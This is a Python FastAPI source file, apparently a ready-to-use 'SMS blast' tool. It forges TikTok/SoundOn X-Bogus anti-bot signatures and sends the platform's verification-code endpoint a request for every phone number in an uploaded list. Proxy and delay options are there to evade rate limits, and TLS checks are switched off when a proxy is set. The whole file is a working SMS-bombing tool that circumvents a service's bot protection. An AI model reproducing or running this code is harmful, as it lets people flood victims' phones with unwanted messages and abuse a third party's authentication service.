#!/usr/bin/env python3
"""
MUDASIR SMS — FastAPI Backend
SoundOn SMS Blast with pure HTTP X-Bogus signature generation.
"""
import asyncio
import base64
import csv
import hashlib
import io
import json
import os
import random
import re
import struct
import time
import uuid
from datetime import datetime
from typing import Optional

import requests as req_lib
import urllib3
from fastapi import FastAPI, UploadFile, File, Form, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.staticfiles import StaticFiles

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI(title="MUDASIR SMS")

# ─── X-Bogus Signature (pure Python) ────────────────────────────────

CUSTOM_B64 = "Dkdpgh4ZKsQB80/Mfvw36XI1R25-WUAlEi7NLboqYTOPuzmFjJnryx9HVGcaStCe="
STD_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
UA_KEY = bytes([0x00, 0x01, 0x0E])
PL_KEY = bytes([0xFF])
MAGIC = 0x4A41279F
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def _rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)


def _md5(data):
    if isinstance(data, str):
        data = data.encode()
    return hashlib.md5(data).hexdigest()


def _double_md5(data):
    return bytes.fromhex(_md5(bytes.fromhex(_md5(data))))


def _ua_md5(ua: str) -> bytes:
    enc = _rc4(UA_KEY, ua.encode())
    b64 = base64.b64encode(enc).decode("iso-8859-1")
    return bytes.fromhex(_md5(b64))


def xbogus(query: str, body: str = "") -> str:
    ts = int(time.time())
    p = _double_md5(query)
    b = _double_md5(body or "")
    u = _ua_md5(UA)
    pl = bytearray([0x40]) + bytearray(UA_KEY) + bytearray(p[14:16]) + \
         bytearray(b[14:16]) + bytearray(u[14:16]) + \
         bytearray(struct.pack(">I", ts)) + bytearray(struct.pack(">I", MAGIC))
    xor = 0
    for byte in pl:
        xor ^= byte
    pl.append(xor & 0xFF)
    enc = _rc4(PL_KEY, bytes(pl))
    final = bytes([0x02, 0xFF]) + enc
    std = base64.b64encode(final).decode("ascii")
    return std.translate(str.maketrans(STD_B64, CUSTOM_B64))


def encode_phone(phone: str) -> str:
    return "".join(f"{ord(c) ^ 5:02x}" for c in phone)


# ─── Number Cleaning ────────────────────────────────────────────────

def clean_numbers(raw_text: str) -> list[str]:
    """Extract valid phone numbers from raw text, removing all non-phone content."""
    numbers = []
    for line in raw_text.splitlines():
        line = line.strip()
        if not line:
            continue
        # Remove common CSV artifacts and text
        # Try to extract phone-like patterns: +digits, or just digits with possible separators
        matches = re.findall(r'\+?\d[\d\s\-().]{6,}', line)
        for m in matches:
            # Clean: keep only + and digits
            cleaned = re.sub(r'[^\d+]', '', m)
            if not cleaned.startswith('+'):
                # Try to detect if it's a number without +
                if len(cleaned) >= 10:
                    cleaned = '+' + cleaned
                else:
                    continue
            if len(cleaned) >= 10:
                numbers.append(cleaned)
    return numbers


# ─── SMS Sender ──────────────────────────────────────────────────────

class SMSSender:
    def __init__(self, proxy: Optional[str] = None):
        self.session = req_lib.Session()
        self.session.headers["user-agent"] = UA
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
            self.session.verify = False
        self.csrf = ""
        self.ms_token = ""

    def _refresh_tokens(self):
        params = {"aid": "5049", "account_sdk_source": "web",
                  "sdk_version": "2.1.10-tiktok", "language": "en"}
        body = "hashed_id=init&type=1"
        from urllib.parse import urlencode
        qs = urlencode(params)
        params["X-Bogus"] = xbogus(qs, body)
        self.session.post(
            "https://www.soundon.global/passport/web/region/",
            params=params, data=body,
            headers={"content-type": "application/x-www-form-urlencoded",
                     "referer": "https://www.soundon.global/login/login?lang=en&region=PK"},
            timeout=30)
        self.csrf = self.session.cookies.get("passport_csrf_token", "")
        self.ms_token = self.session.cookies.get("msToken", "")

    def send(self, phone: str) -> dict:
        if not self.csrf:
            self._refresh_tokens()
        encoded = encode_phone(phone)
        body = f"mix_mode=1&mobile={encoded}&type=3731&language=en&fixed_mix_mode=1"
        from urllib.parse import urlencode
        params = {"aid": "5049", "account_sdk_source": "web",
                  "sdk_version": "2.1.10-tiktok", "language": "en",
                  "verifyFp": f"verify_{int(time.time())}_{os.urandom(4).hex()}"}
        if self.ms_token:
            params["msToken"] = self.ms_token
        qs = urlencode(params)
        params["X-Bogus"] = xbogus(qs, body)
        r = self.session.post(
            "https://www.soundon.global/passport/web/send_code/",
            params=params, data=body,
            headers={"content-type": "application/x-www-form-urlencoded",
                     "referer": "https://www.soundon.global/login/login?lang=en&region=PK",
                     "x-tt-passport-csrf-token": self.csrf,
                     "accept": "application/json, text/javascript"},
            timeout=30)
        new_csrf = self.session.cookies.get("passport_csrf_token", "")
        if new_csrf:
            self.csrf = new_csrf
        new_ms = self.session.cookies.get("msToken", "")
        if new_ms:
            self.ms_token = new_ms
        return r.json()


# ─── In-memory job tracking ─────────────────────────────────────────

jobs: dict[str, dict] = {}


# ─── API Endpoints ──────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def root():
    return FileResponse(os.path.join(os.path.dirname(__file__), "index.html"))


@app.post("/api/clean")
async def clean_file(file: UploadFile = File(...)):
    """Upload CSV/TXT and return cleaned phone numbers."""
    content = await file.read()
    text = content.decode("utf-8", errors="ignore")
    numbers = clean_numbers(text)
    return {"numbers": numbers, "count": len(numbers)}


@app.post("/api/start")
async def start_blast(
    numbers: str = Form(...),
    proxy: str = Form(""),
    delay_mode: str = Form("fixed"),       # "fixed" | "random" | "zero"
    delay_min: float = Form(0),
    delay_max: float = Form(0),
):
    """Start SMS blast job. Returns job_id for WebSocket tracking."""
    phone_list = [n.strip() for n in numbers.split("\n") if n.strip()]
    if not phone_list:
        return {"error": "No numbers provided"}

    job_id = str(uuid.uuid4())[:8]
    jobs[job_id] = {
        "id": job_id,
        "status": "running",
        "total": len(phone_list),
        "sent": 0,
        "failed": 0,
        "results": [],
        "numbers": phone_list,
        "proxy": proxy.strip() or None,
        "delay_mode": delay_mode,
        "delay_min": delay_min,
        "delay_max": delay_max,
    }

    asyncio.create_task(_run_job(job_id))
    return {"job_id": job_id, "total": len(phone_list)}


async def _run_job(job_id: str):
    job = jobs[job_id]
    sender = SMSSender(proxy=job["proxy"])

    for i, phone in enumerate(job["numbers"]):
        if job["status"] == "stopped":
            break

        try:
            resp = await asyncio.to_thread(sender.send, phone)
            if resp.get("message") == "success":
                mobile = resp.get("data", {}).get("mobile", "")
                ticket = resp.get("data", {}).get("mobile_ticket", "")
                job["sent"] += 1
                job["results"].append({
                    "phone": phone, "status": "sent",
                    "mobile": mobile, "ticket": ticket,
                    "time": datetime.now().strftime("%H:%M:%S"),
                })
            else:
                err = resp.get("data", {}).get("description", "unknown")
                code = resp.get("data", {}).get("error_code", "")
                job["failed"] += 1
                job["results"].append({
                    "phone": phone, "status": "error",
                    "error": f"err_{code}: {err}",
                    "time": datetime.now().strftime("%H:%M:%S"),
                })
        except Exception as e:
            job["failed"] += 1
            job["results"].append({
                "phone": phone, "status": "error",
                "error": str(e),
                "time": datetime.now().strftime("%H:%M:%S"),
            })

        # Delay between requests
        if i < len(job["numbers"]) - 1 and job["status"] == "running":
            if job["delay_mode"] == "zero":
                pass
            elif job["delay_mode"] == "random":
                d = random.uniform(job["delay_min"], job["delay_max"])
                await asyncio.sleep(d)
            else:  # fixed
                await asyncio.sleep(job["delay_min"])

    job["status"] = "done"


@app.get("/api/job/{job_id}")
async def get_job(job_id: str):
    if job_id not in jobs:
        return {"error": "Job not found"}
    return jobs[job_id]


@app.post("/api/stop/{job_id}")
async def stop_job(job_id: str):
    if job_id in jobs:
        jobs[job_id]["status"] = "stopped"
    return {"ok": True}


@app.websocket("/ws/{job_id}")
async def websocket_job(websocket: WebSocket, job_id: str):
    await websocket.accept()
    last_idx = 0
    try:
        while True:
            if job_id not in jobs:
                await websocket.send_json({"error": "Job not found"})
                break
            job = jobs[job_id]
            # Send new results
            if len(job["results"]) > last_idx:
                for r in job["results"][last_idx:]:
                    await websocket.send_json(r)
                last_idx = len(job["results"])
            # Send status update
            await websocket.send_json({
                "type": "status",
                "status": job["status"],
                "sent": job["sent"],
                "failed": job["failed"],
                "total": job["total"],
            })
            if job["status"] in ("done", "stopped"):
                break
            await asyncio.sleep(0.5)
    except WebSocketDisconnect:
        pass
